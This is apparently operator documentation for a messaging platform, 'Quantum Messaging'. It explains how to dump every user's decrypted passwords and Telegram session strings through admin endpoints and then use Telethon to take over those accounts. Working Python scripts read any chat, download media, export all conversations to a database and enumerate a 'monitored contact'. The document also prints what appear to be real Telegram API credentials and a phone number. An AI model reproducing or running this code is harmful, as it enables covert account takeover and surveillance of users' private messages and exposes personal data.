# Accessing User Accounts & Telegram Credentials

This document explains how to access user credentials and Telegram accounts from the Quantum Messaging platform.

## Prerequisites

- **Coordinator Password**: The `QM_COORDINATOR_PASSWORD` set in the Render deployment
- **Deployment URL**: `https://quantummessaging.onrender.com` (or your deployment URL)

## Admin API Endpoints

All admin endpoints require the `X-Admin-Password` header with the coordinator password.

### 1. Get All Users with Full Credentials

```bash
GET /api/admin/credentials
```

Returns all users with decrypted credentials including:
- `api_id`, `api_hash`, `phone` (Telegram API credentials)
- `session_string` (allows accessing Telegram without re-authentication)
- `target_username`, `target_display_name` (monitored contact)
- `password` (app login password)

**Example (Python):**
```python
import urllib.request
import json

url = "https://quantummessaging.onrender.com/api/admin/credentials"
headers = {"X-Admin-Password": "YOUR_COORDINATOR_PASSWORD"}

req = urllib.request.Request(url, headers=headers)
with urllib.request.urlopen(req) as response:
    data = json.loads(response.read().decode())
    print(json.dumps(data, indent=2))
```

**Response:**
```json
{
  "count": 2,
  "note": "Use session_string with Telethon StringSession to access accounts without re-authentication",
  "users": [
    {
      "id": 1,
      "username": "ale1",
      "password": "userpassword",
      "telegram": {
        "api_id": "32681421",
        "api_hash": "83e510bef393eab3ad1e5d4971f1fdee",
        "phone": "+447510794631",
        "session_string": "1BJWap1sBu6hurEk...",
        "target_username": "@pirata_pataka",
        "target_display_name": "A"
      }
    }
  ]
}
```

### 2. Get Specific User's Telegram Credentials

```bash
GET /api/admin/user/<username>/telegram
```

Returns ready-to-use Telegram credentials with a code example.

**Example:**
```python
url = "https://quantummessaging.onrender.com/api/admin/user/ale1/telegram"
headers = {"X-Admin-Password": "YOUR_COORDINATOR_PASSWORD"}
```

### 3. Get User's Message History

```bash
GET /api/admin/user/<username>/messages?limit=100&offset=0&include_deleted=false
```

Returns messages stored in the user's database.

### 4. Get User's Chat List

```bash
GET /api/admin/user/<username>/chats
```

Returns unique chats from the user's message history.

---

## Accessing Telegram Directly

Once you have the credentials, you can access any Telegram conversation using Telethon.

### Install Telethon

```bash
pip install telethon
```

### List All Chats

```python
import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession

# Credentials from admin API
api_id = 32681421
api_hash = "83e510bef393eab3ad1e5d4971f1fdee"
session_string = "1BJWap1sBu6hurEk..."  # Full session string from API

async def list_chats():
    client = TelegramClient(StringSession(session_string), api_id, api_hash)
    await client.start()

    dialogs = await client.get_dialogs(limit=50)

    for dialog in dialogs:
        print(f"{dialog.name}: {dialog.unread_count} unread")

    await client.disconnect()

asyncio.run(list_chats())
```

### Download Messages from Any Chat

```python
async def download_chat(chat_name_or_username, limit=100):
    client = TelegramClient(StringSession(session_string), api_id, api_hash)
    await client.start()

    # Get messages from a specific chat
    messages = await client.get_messages(chat_name_or_username, limit=limit)

    for msg in messages:
        sender = await msg.get_sender()
        sender_name = getattr(sender, 'first_name', 'Unknown')
        print(f"[{msg.date}] {sender_name}: {msg.text or '[media]'}")

    await client.disconnect()

asyncio.run(download_chat("Ben Handley", limit=50))
```

### Download Media

```python
async def download_media_from_chat(chat_name, download_path="./downloads"):
    import os
    os.makedirs(download_path, exist_ok=True)

    client = TelegramClient(StringSession(session_string), api_id, api_hash)
    await client.start()

    messages = await client.get_messages(chat_name, limit=100)

    for msg in messages:
        if msg.media:
            path = await client.download_media(msg, download_path)
            print(f"Downloaded: {path}")

    await client.disconnect()

asyncio.run(download_media_from_chat("Contact Name"))
```

### Get All Conversations to Database

```python
import sqlite3

async def export_all_chats_to_db(db_path="all_chats.db"):
    client = TelegramClient(StringSession(session_string), api_id, api_hash)
    await client.start()

    # Create database
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY,
            chat_name TEXT,
            chat_id INTEGER,
            sender_name TEXT,
            sender_id INTEGER,
            text TEXT,
            timestamp TEXT,
            media_type TEXT
        )
    """)

    dialogs = await client.get_dialogs(limit=100)

    for dialog in dialogs:
        print(f"Exporting: {dialog.name}")
        messages = await client.get_messages(dialog, limit=500)

        for msg in messages:
            sender = await msg.get_sender()
            cursor.execute("""
                INSERT OR REPLACE INTO messages
                (id, chat_name, chat_id, sender_name, sender_id, text, timestamp, media_type)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                msg.id,
                dialog.name,
                dialog.id,
                getattr(sender, 'first_name', 'Unknown') if sender else 'Unknown',
                sender.id if sender else 0,
                msg.text or '',
                msg.date.isoformat() if msg.date else '',
                type(msg.media).__name__ if msg.media else None
            ))

        conn.commit()

    conn.close()
    await client.disconnect()
    print(f"Exported to {db_path}")

asyncio.run(export_all_chats_to_db())
```

---

## Complete Example Script

```python
#!/usr/bin/env python3
"""
Access Telegram accounts from Quantum Messaging.
Usage: python access_telegram.py
"""

import asyncio
import urllib.request
import json
from telethon import TelegramClient
from telethon.sessions import StringSession

# Configuration
DEPLOYMENT_URL = "https://quantummessaging.onrender.com"
COORDINATOR_PASSWORD = "YOUR_PASSWORD_HERE"


def get_all_credentials():
    """Fetch all user credentials from admin API."""
    url = f"{DEPLOYMENT_URL}/api/admin/credentials"
    headers = {"X-Admin-Password": COORDINATOR_PASSWORD}

    req = urllib.request.Request(url, headers=headers)
    with urllib.request.urlopen(req) as response:
        return json.loads(response.read().decode())


async def list_user_chats(user_creds):
    """List all chats for a user."""
    tg = user_creds['telegram']

    client = TelegramClient(
        StringSession(tg['session_string']),
        int(tg['api_id']),
        tg['api_hash']
    )
    await client.start()

    print(f"\n=== Chats for {user_creds['username']} ===")
    dialogs = await client.get_dialogs(limit=30)

    for i, dialog in enumerate(dialogs, 1):
        print(f"{i:2}. {dialog.name} ({dialog.unread_count} unread)")

    await client.disconnect()


async def main():
    # Get all credentials
    data = get_all_credentials()
    print(f"Found {data['count']} users")

    # List chats for each user
    for user in data['users']:
        if user['telegram'].get('session_string'):
            await list_user_chats(user)


if __name__ == "__main__":
    asyncio.run(main())
```

---

## API Quick Reference

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/admin/credentials` | GET | All users with decrypted credentials |
| `/api/admin/users` | GET | Basic user list (no credentials) |
| `/api/admin/user/<username>` | GET | Single user details |
| `/api/admin/user/<username>/telegram` | GET | Telegram creds with usage example |
| `/api/admin/user/<username>/messages` | GET | Messages from user's DB |
| `/api/admin/user/<username>/chats` | GET | Unique chats in user's DB |

All endpoints require header: `X-Admin-Password: <coordinator_password>`

---

## Security Notes

- The coordinator password encrypts all sensitive data in the database
- Session strings provide full access to Telegram accounts - handle with care
- Session strings don't expire until the user logs out or revokes the session
- All admin endpoints are protected by the coordinator password
